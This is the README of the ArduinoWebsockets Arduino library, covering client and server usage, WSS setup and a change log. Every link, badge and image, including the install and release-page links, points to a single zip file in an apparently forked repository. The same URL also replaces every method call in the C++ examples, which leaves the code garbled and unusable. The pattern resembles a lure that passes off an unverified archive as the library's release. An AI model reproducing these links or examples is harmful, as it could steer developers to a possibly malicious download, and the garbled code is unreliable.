[![arduino-library-badge](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)  [![Build Status](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)

# Arduino Websockets

A library for writing modern websockets applications with Arduino (see [prerequisites](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for supported platforms). This project is based on my project [TinyWebsockets](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip).

The library provides simple and easy interface for websockets work (Client and Server). See the [basic-usage](#Basic-Usage) guide and the [examples](#Full-Examples).

### Please check out the [TinyWebsockets Wiki](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for many more details!

## Getting Started
This section should help you get started with the library. If you have any questions feel free to open an issue.

### Prerequisites
Currently (version 0.5.*) the library only works with `ESP8266`, `ESP32` and `Teensy 4.1`.

### Installing

You can install the library from the Arduino IDE or using a release ZIP file from the [Github release page](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip).
Detailed instructions can be found [here](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip).

## Basic Usage

### Client

Creating a client and connecting to a server:
```c++
WebsocketsClient client;
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("ws://your-server-ip:port/uri");
```

Sending a message:
```c++
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Hello Server!");
```

Waiting for messages:
```c++
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip([](WebsocketsMessage msg){
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Got Message: " + https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip());
});
```

In order to keep receiving messages, you should:
```c++
void loop() {
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
}
```
### Server

Creating a server and listening for connections:
```c++
WebsocketsServer server;
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(8080);
```

Accepting connections:
```c++
WebsocketsClient client = https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
// handle client as described before :)
```

## Full Examples

### Client

```c++
#include <ArduinoWebsockets.h>
#include <ESP8266WiFi.h>

const char* ssid = "ssid"; //Enter SSID
const char* password = "password"; //Enter Password
const char* websockets_server = "https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"; //server adress and port

using namespace websockets;

void onMessageCallback(WebsocketsMessage message) {
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Got Message: ");
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip());
}

void onEventsCallback(WebsocketsEvent event, String data) {
    if(event == WebsocketsEvent::ConnectionOpened) {
        https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Connnection Opened");
    } else if(event == WebsocketsEvent::ConnectionClosed) {
        https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Connnection Closed");
    } else if(event == WebsocketsEvent::GotPing) {
        https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Got a Ping!");
    } else if(event == WebsocketsEvent::GotPong) {
        https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Got a Pong!");
    }
}

WebsocketsClient client;
void setup() {
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(115200);
    // Connect to wifi
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(ssid, password);

    // Wait some time to connect to wifi
    for(int i = 0; i < 10 && https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip() != WL_CONNECTED; i++) {
        https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(".");
        delay(1000);
    }

    // Setup Callbacks
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(onMessageCallback);
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(onEventsCallback);
    
    // Connect to server
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(websockets_server);

    // Send a message
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Hi Server!");
    // Send a ping
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
}

void loop() {
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
}
```
***Note:** for ESP32 you only need to change to code that connects to WiFi (replace `#include <ESP8266WiFi.h>` with `#include <WiFi.h>`), everything else stays the same.*

### Server
```c++
#include <ArduinoWebsockets.h>
#include <ESP8266WiFi.h>

const char* ssid = "ssid"; //Enter SSID
const char* password = "password"; //Enter Password

using namespace websockets;

WebsocketsServer server;
void setup() {
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(115200);
  // Connect to wifi
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(ssid, password);

  // Wait some time to connect to wifi
  for(int i = 0; i < 15 && https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip() != WL_CONNECTED; i++) {
      https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(".");
      delay(1000);
  }
  
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("");
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("WiFi connected");
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("IP address: ");
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip());   //You can get IP address assigned to ESP

  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(80);
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Is server live? ");
  https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip());
}

void loop() {
  auto client = https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
  if(https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip()) {
    auto msg = https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();

    // log
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Got Message: ");
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip());

    // return echo
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("Echo: " + https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip());

    // close the connection
    https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
  }
  
  delay(1000);
}
```
***Note:** for ESP32 you only need to change to code that connects to WiFi (replace `#include <ESP8266WiFi.h>` with `#include <WiFi.h>`), everything else stays the same.*

## Binary Data

For binary data it is recommended to use `https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip()` which returns a `std::string`, or `msg.c_str()` which returns a `const char*`. 
The reason is that `https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip()` returns an Arduino `String`, which is great for Serial printing and very basic memory handling but bad for most binary usages.

See [issue #32](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for further information.

## SSL and WSS Support

No matter what board you are using, in order to use WSS (websockets over SSL) you need to use
```c++
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip("wss://your-secured-server-ip:port/uri");
```

The next sections describe board-specific code for using WSS with the library.

### ESP8266
With the esp8266 there are multiple ways for using WSS. By default, `ArduinoWebsockets` does not validate the certificate chain. This can be set explicitly using:
```c++
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip();
```

You can also use a `SSL Fingerprint` to validate the SSL connection, for example:
```c++
const char ssl_fingerprint[] PROGMEM = "D5 07 4D 79 B2 D2 53 D7 74 E6 1B 46 C5 86 4E FE AD 00 F1 98";

https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(ssl_fingerprint);
```

or you could use the `setKnownKey()` method to specify the public key of a certificate in order to validate the server you are connecting to.
```
PublicKey *publicKey = new PublicKey(public_key);
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(publicKey);
```
or you can specify the Certificate Authority (CA) using `setTrustAnchors` method, as follows:

```
X509List *serverTrustedCA = new X509List(ca_cert);
https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(serverTrustedCA);
```

For client-side certificate validation, you can use RSA or EC certificates, using the method `setClientRSACert` or `setClientECCert` .

### ESP32
With the esp32 you could either provide the full certificate, or provide no certificate. An example for setting CA Certificate:
```c++
const char ssl_ca_cert[] PROGMEM = \
    "-----BEGIN CERTIFICATE-----\n" \
    "MIIEkjCCA3qgAwIBAgIQCgFBQgAAAVOFc2oLheynCDANBgkqhkiG9w0BAQsFADA/\n" \
    "MSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT\n" \
    "DkRTVCBSb290IENBIFgzMB4XDTE2MDMxNzE2NDA0NloXDTIxMDMxNzE2NDA0Nlow\n" \
    "SjELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUxldCdzIEVuY3J5cHQxIzAhBgNVBAMT\n" \
    "GkxldCdzIEVuY3J5cHQgQXV0aG9yaXR5IFgzMIIBIjANBgkqhkiG9w0BAQEFAAOC\n" \
    "AQ8AMIIBCgKCAQEAnNMM8FrlLke3cl03g7NoYzDq1zUmGSXhvb418XCSL7e4S0EF\n" \
    "q6meNQhY7LEqxGiHC6PjdeTm86dicbp5gWAf15Gan/PQeGdxyGkOlZHP/uaZ6WA8\n" \
    "SMx+yk13EiSdRxta67nsHjcAHJyse6cF6s5K671B5TaYucv9bTyWaN8jKkKQDIZ0\n" \
    "Z8h/pZq4UmEUEz9l6YKHy9v6Dlb2honzhT+Xhq+w3Brvaw2VFn3EK6BlspkENnWA\n" \
    "a6xK8xuQSXgvopZPKiAlKQTGdMDQMc2PMTiVFrqoM7hD8bEfwzB/onkxEz0tNvjj\n" \
    "/PIzark5McWvxI0NHWQWM6r6hCm21AvA2H3DkwIDAQABo4IBfTCCAXkwEgYDVR0T\n" \
    "AQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAYYwfwYIKwYBBQUHAQEEczBxMDIG\n" \
    "CCsGAQUFBzABhiZodHRwOi8vaXNyZy50cnVzdGlkLm9jc3AuaWRlbnRydXN0LmNv\n" \
    "bTA7BggrBgEFBQcwAoYvaHR0cDovL2FwcHMuaWRlbnRydXN0LmNvbS9yb290cy9k\n" \
    "c3Ryb290Y2F4My5wN2MwHwYDVR0jBBgwFoAUxKexpHsscfrb4UuQdf/EFWCFiRAw\n" \
    "VAYDVR0gBE0wSzAIBgZngQwBAgEwPwYLKwYBBAGC3xMBAQEwMDAuBggrBgEFBQcC\n" \
    "ARYiaHR0cDovL2Nwcy5yb290LXgxLmxldHNlbmNyeXB0Lm9yZzA8BgNVHR8ENTAz\n" \
    "MDGgL6AthitodHRwOi8vY3JsLmlkZW50cnVzdC5jb20vRFNUUk9PVENBWDNDUkwu\n" \
    "Y3JsMB0GA1UdDgQWBBSoSmpjBH3duubRObemRWXv86jsoTANBgkqhkiG9w0BAQsF\n" \
    "AAOCAQEA3TPXEfNjWDjdGBX7CVW+dla5cEilaUcne8IkCJLxWh9KEik3JHRRHGJo\n" \
    "uM2VcGfl96S8TihRzZvoroed6ti6WqEBmtzw3Wodatg+VyOeph4EYpr/1wXKtx8/\n" \
    "wApIvJSwtmVi4MFU5aMqrSDE6ea73Mj2tcMyo5jMd6jmeWUHK8so/joWUoHOUgwu\n" \
    "X4Po1QYz+3dszkDqMp4fklxBwXRsW10KXzPMTZ+sOPAveyxindmjkW8lGy+QsRlG\n" \
    "PfZ+G6Z6h7mjem0Y+iWlkYcV4PIWL1iwBi8saCbGS5jN2p8M+X+Q7UNKEkROb3N6\n" \
    "KOqkqm57TH2H3eDJAkSnh6/DNFu0Qg==\n" \
    "-----END CERTIFICATE-----\n";

https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(ssl_ca_cert);
```

### TEENSY 4.1
Currently WSS is not implemented.

## Contributing
Contributions are welcomed! Please open issues if you have troubles while using the library or any queshtions on how to get started. Pull requests are welcomed, please open an issue first.

## Contributors
Thanks for everyone who reported a bug, suggested a feature and contributed to the development of this library.
<table>
  <tr>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="arnoson"/><br /><sub><b>⭐️ arnoson</b></sub></a><br /></td>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="ramdor"/><br /><sub><b>⭐️ ramdor</b></sub></a><br /></td>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="xgarb"/><br /><sub><b>⭐️ xgarb</b></sub></a><br /></td>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="matsujirushi"/><br /><sub><b>matsujirushi</b></sub></a><br /></td>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="bastienvans"/><br /><sub><b>bastienvans</b></sub></a><br /></td>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="johneakin"/><br /><sub><b>johneakin</b></sub></a><br /></td>
    <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="lalten"/><br /><sub><b>lalten</b></sub></a><br /></td>
  </tr>
  <tr>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="adelin-mcbsoft"/><br /><sub><b>⭐️ adelin-mcbsoft</b></sub></a><br /></td>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="Jonty"/><br /><sub><b>⭐️ Jonty</b></sub></a><br /></td>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="Nufflee"/><br /><sub><b>Nufflee</b></sub></a><br /></td>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="mmcArg"/><br /><sub><b>mmcArg</b></sub></a><br /></td>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="JohnInWI"/><br /><sub><b>JohnInWI</b></sub></a><br /></td>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="logdog2709"/><br /><sub><b>logdog2709</b></sub></a><br /></td>
       <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="elC0mpa"/><br /><sub><b>elC0mpa</b></sub></a><br /></td>
 </tr>
    
 <tr>
      <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="oofnik"/><br /><sub><b>⭐️ oofnik</b></sub></a><br /></td>
          <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="zastrixarundell"/><br /><sub><b>⭐️ zastrixarundell</b></sub></a><br /></td>
        <td align="center"><a href="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip"><img src="https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip" width="100px;" alt="elielmarcos"/><br /><sub><b>elielmarcos</b></sub></a><br /></td>

 </tr>
 
</table>

## Change Log
- **14/02/2019 (v0.1.1)** - Initial commits and support for ESP32 and ESP8266 Websocket Clients.
- **16/02/2019 (v0.1.2)** - Added support for events (Pings, Pongs) and more internal improvements (events handling according to [RFC-6455](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip))
- **20/02/2019 (v0.1.3)** - Users now dont have to specify TCP client types (ESP8266/ESP32) they are selected automatically.
- **21/02/2019 (v0.1.5)** - Bug Fixes. Client now exposes a single string connect interface.
- **24/02/2019 (v0.2.0)** - User-facing interface is now done with Arduino's `String` class. Merged more changes (mainly optimizations) from TinyWebsockets.
- **25/02/2019 (v0.2.1)** - A tiny patch. Fixed missing user-facing strings for client interface. 
- **07/03/2019 (v0.3.0)** - A version update. Now supports a websockets server, better support for fragmented messages and streams. bug fixes and more optimized networking implementations. 
- **08/03/2019 (v0.3.1)** - Small patch. Merged changes from TinyWebsockets - interface changes to callbacks (partial callbacks without WebsocketsClient& as first parameter).
- **12/03/2019 (v0.3.2)** - Fixed a bug with behaviour of WebsokcetsClient (copy c'tor and assignment operator). Added close codes from TinyWebsockets. Thank you [@ramdor](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)
- **13/03/2019 (v0.3.3)** - Fixed a bug in the esp8266 networking impl. Thank you [@ramdor](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)
- **14/03/2019 (v0.3.4)** - changed underling tcp impl for esp8266 and esp32 to use `setNoDelay(true)` instead of sync communication. This makes communication faster and more relaiable than default. Thank you @ramdor for pointing out these methods.
- **06/04/2019 (v0.3.5)** - added very basic support for WSS in esp8266 (no support for fingerprint/ca or any kind of chain validation). 
- **22/04/2019 (v0.4.0)** - Added WSS support for both esp8266 and esp32. E328266 can use `https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip()` (does not validate certificate chain) or `https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(fingerprint)` in order to use WSS. With ESP32 there is `https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip(certificate)` that can be used. (Usage is same as the built in `WiFiClientSecure`).
- **18/05/2019 (v0.4.1)** - Patch! Addressed an error with some servers. The bugs where first noted in [issue #9](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip). Bug was that some servers will drop connections that don't use masking, and TinyWebsockets does not use masking by default. TinyWebsockets changed that and this library merged the changes.
- **24/05/2019 (v0.4.2)** - Patch! Adressed masking issues - server to client messages would get masked but RFC forbbids it. (changes merged from TinyWebsockets)
- **07/06/2019 (v0.4.3)** - Patch! Fixed a bug on some clients (mainly FireFox websokcets impl). Thank you @xgarb ([related issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip))
- **09/06/2019 (v0.4.4)** - Patch! Fixed an issue with `close` event callback not called in some cases (sudden disconnect, for example). Thank you @adelin-mcbsoft for pointing out the issue ([related issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip))
- **14/06/2019 (v0.4.5)** - Patch! Fixed a memory leak and an unnecessary use of heap memory in case of masking messages. This was discoverd thanks to [issue #16](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip). Thank you [xgarb](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)!
- **13/07/2019 (v0.4.6)** - Very small update. Changed readme to document esp32's secured client behvior ([As discussed in issue #18](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)). Also esp32's version of WebsocketsClient now has a `setInsecure` method. Thank you [adelin-mcbsoft](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)!
- **25/07/2019 (v0.4.7)** - Bugfix. Fixed issues with receving large messages (unchecked reads) which was pointed out in [in issue #21](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)). Thank you [Jonty](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)!
- **26/07/2019 (v0.4.8)** - Feature. Added an `addHeader` method as suggested [in issue #22](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)). Thank you [mmcArg](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)!
- **01/08/2019 (v0.4.9)** - Patch - Bugfix. Worked around a bug where connecting to unavailable endpoints would not return false (this is a bug with the `WiFiClient` library itself). Added some missing keywords. Thank you [Nufflee](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for pointing out the [issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)!
- **10/08/2019 (v0.4.10)** - Patch - Bugfix. Fixed a bug (and general in-stability) caused from unchecked and unsafe read operations on sockets. Also improved memory usage and management. Thank you [Jonty](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for openning and helping with the [issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip)!
- **14/09/2019 (v0.4.11)** - Bugfixes - masking settings used to not get copied when using assignment between `WebsocketClient` instances. Also handshake validation is now case insensitive. Thank you [logdog2709](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for pointing out the [issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip).
- **12/10/2019 (v0.4.12)** - Patch - Messages are now sent as a single TCP buffer instead of separate messages. Thank you [elC0mpa](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for posting the [issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip).
- **19/10/2019 (v0.4.13)** - Patch - added `yield` calls in order to prevent software-watchdog resets on esp8266 (on long messages). Thank you [elC0mpa](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip) for documenting and helping with the [issue](https://raw.githubusercontent.com/GURU162004/ArduinoWebsockets/master/examples/Teensy41-Server/Websockets-Arduino-1.3.zip).
- **22/11/2019 (v0.4.14)** - Added `rawData` and `c_str` as acccessors in `WebsocketsMessage` so now the raw data can be acccessed which should solve issue #32 and not break any existing sketch.
